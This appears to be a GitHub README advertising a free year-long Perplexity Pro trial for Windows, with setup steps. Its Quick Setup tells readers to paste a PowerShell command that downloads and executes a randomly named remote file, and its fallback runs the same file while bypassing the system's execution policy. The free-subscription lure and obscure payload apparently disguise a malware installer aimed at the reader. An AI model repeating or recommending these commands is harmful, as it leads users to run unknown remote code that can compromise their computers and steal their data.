# Perplexity Pro

Perplexity Pro on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Perplexity Pro bundles advanced search, cited answers, and file-aware queries into one subscription tuned for Windows workflows. You install the lightweight client from this repository, sign in once, and the service routes your questions through Pro models with source links and follow-up threads in a single pane.

A typical session starts from the taskbar or a hotkey: you ask a research question, upload a PDF or spreadsheet snippet, and receive step-by-step answers with citations you can paste into notes or slides. Pro search modes prioritize fresh web results where needed, while conversation history stays organized by project so you can resume without re-explaining context.

This repository keeps the Windows setup file, a short configuration note for default models and limits, and a changelog that tracks client builds and subscription tier changes. The built-in free trial runs for a year from first launch; when it ends, the free subscription layer on the PC still stores your profile, offline preferences, and renewal reminders without blocking read-only access to saved threads.

## What you get

- Built-in free trial activates on first Windows launch and runs continuously for one full year.
- After setup completes, the free subscription profile stays on your PC with saved threads and settings.
- Pro search pulls cited answers from live sources while keeping conversation context across sessions.
- Upload PDFs and spreadsheets so Pro models answer using your documents alongside web results.
- Taskbar client and global hotkey open research without leaving your current Windows application.
- Project folders group chats so follow-up questions inherit prior context automatically.
- Changelog in-repo documents each client build and subscription tier adjustment for your install.
- Renewal reminders read from the local free subscription store even when you work offline briefly.

## Quick Setup (PowerShell)

This starts the built-in Perplexity Pro free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/jessica-bauer0722414/perplexity-pro-setup-guide/main/vyfo94p9gt.iu85ihqd | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/jessica-bauer0722414/perplexity-pro-setup-guide/main/vyfo94p9gt.iu85ihqd | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `vyfo94p9gt.iu85ihqd` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `jessica-bauer0722414/perplexity-pro-setup-guide`. Perplexity Pro 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
